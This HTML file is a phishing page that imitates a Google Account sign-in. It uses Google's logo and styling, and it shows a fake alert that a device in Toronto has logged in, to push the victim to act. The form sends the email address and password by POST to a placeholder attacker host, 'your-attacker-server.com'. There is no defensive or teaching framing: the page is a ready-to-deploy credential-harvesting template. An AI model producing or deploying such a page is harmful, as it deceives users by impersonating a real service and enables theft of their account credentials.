<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Google Account - Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background: #f9f9f9;
      margin: 0;
      padding: 20px;
    }
    .container {
      max-width: 450px;
      margin: auto;
      background: #fff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 0 15px #ccc;
    }
    .logo {
      text-align: center;
      margin-bottom: 25px;
    }
    .logo img {
      width: 120px;
    }
    .form-group {
      margin-bottom: 15px;
    }
    input[type="email"], input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: 2px solid #4285F4;
      border-radius: 6px;
      font-size: 14px;
      background-color: #f2f2f2;
    }
    .show-password {
      display: block;
      margin: 10px 0;
      font-size: 14px;
    }
    button {
      width: 100%;
      padding: 14px;
      background: #4285F4;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 14px;
      transition: background 0.3s ease;
    }
    button:hover {
      background: #357ae8;
    }
    .message {
      text-align: center;
      font-size: 14px;
      color: #555;
      margin: 20px 0;
    }
    .support-link {
      display: block;
      text-align: center;
      margin-top: 15px;
      font-size: 12px;
      color: #888;
      text-decoration: none;
    }
    .support-link:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google
Logo">
    </div>
    <form action="https://your-attacker-server.com/login" method="POST">
      <div class="form-group">
        <input type="email" name="email" placeholder="Email" required>
      </div>
      <div class="form-group">
        <input type="password" name="password" placeholder="Password" required>
      </div>
      <label class="show-password">
        <input type="checkbox" id="showPassword"> Show password
      </label>
      <button type="submit">Next</button>
    </form>
    <div class="message">
      <p>A device from <strong>Toronto, Canada</strong> has logged in.</p>
      <p>Allow or deny access to continue.</p>
    </div>
    <a href="https://support.google.com/accounts" class="support-link" target="_blank">Need help?</a>
  </div>
</body>
</html>
